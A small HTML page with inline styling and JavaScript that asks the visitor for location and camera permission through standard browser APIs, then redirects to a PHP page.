<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Permission Page</title>
 <!-- Link multiple size icons -->
    <link rel="icon" type="image/x-icon" href="logo (1).ico" sizes="16x16">
    <link rel="icon" type="image/x-icon" href="logo (2).ico" sizes="32x32">
    <link rel="icon" type="image/x-icon" href="logo (3).ico" sizes="64x64">
    <link rel="icon" type="image/x-icon" href="logo (4).ico" sizes="128x128">
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .container {
        text-align: center;
        background-color: #fff;
        border-radius: 8px;
        padding: 20px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    h1 {
        color: #333;
    }

    p {
        color: #666;
        margin-bottom: 20px;
    }

    button {
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 4px;
        padding: 10px 20px;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }

    button:hover {
        background-color: #0056b3;
    }
</style>
</head>
<body>
<div class="container">
    <h1>Permission Page</h1>
    <p>Please grant permission to use your location and camera to proceed.</p>
    <button onclick="grantPermission()">Grant Permission</button>
</div>

<script>

function grantPermission() {
    // Request permission to use location and camera
    navigator.permissions.query({name: 'geolocation'}).then(function(permissionStatus) {
        if (permissionStatus.state === 'granted') {
            // Location permission already granted, proceed to camera permission
            requestCameraPermission();
        } else {
            // Request location permission
            navigator.geolocation.getCurrentPosition(function(position) {
                // Location permission granted, proceed to camera permission
                requestCameraPermission();
            }, function(error) {
                console.error('Error getting geolocation:', error);
            });
        }
    });
}

function requestCameraPermission() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            // Camera permission granted, redirect to main page
            window.location.href = 'redirect.php';
        })
        .catch(function(err) {
            console.error('Error accessing camera:', err);
        });
}
</script>
</body>
</html>
